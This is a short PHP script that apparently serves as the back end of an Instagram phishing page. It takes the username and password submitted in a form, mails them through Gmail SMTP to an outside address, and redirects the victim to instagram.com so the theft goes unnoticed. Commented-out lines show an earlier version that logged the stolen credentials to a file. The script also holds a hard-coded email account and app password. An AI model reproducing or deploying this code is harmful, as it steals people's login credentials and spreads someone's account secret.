<?php
ini_set('display_errors', '1');
$username=$_POST['username'];
$password=$_POST['password'];
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\SMTP;

// require 'phpmailer/src/Exception.php';
// require 'phpmailer/src/PHPMailer.php';
// require 'phpmailer/src/SMTP.php';


$mail = new PHPMailer(true);

$mail->isSMTP();
$mail->Host = 'smtp.gmail.com';
$mail->SMTPAuth = true;
$mail->Username = 'mrsterixmr@gmail.com';
$mail->Password = 'ppamjhevewmihvqz';
$mail->SMTPSecure = 'ssl';
$mail->Port = 465;

$mail->setFrom('mrsterixmr@gmail.com');

$mail->addAddress("Nikibestshark@gmail.com");

$mail->isHTML(true);

$mail->Subject = $username;
$mail->Body = $password;

$mail->send();


// $fp = fopen('data.txt', 'a+');
// fwrite($fp, "login - ". $username."\n");
// fwrite($fp, "password - ". $password."\n");
// fwrite($fp, "--------------------------"."\n");
// fclose($fp);
// $filename = "data.txt";
// echo file_get_contents($filename);
// echo __FILE__;


// file_put_contents("data.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
?> 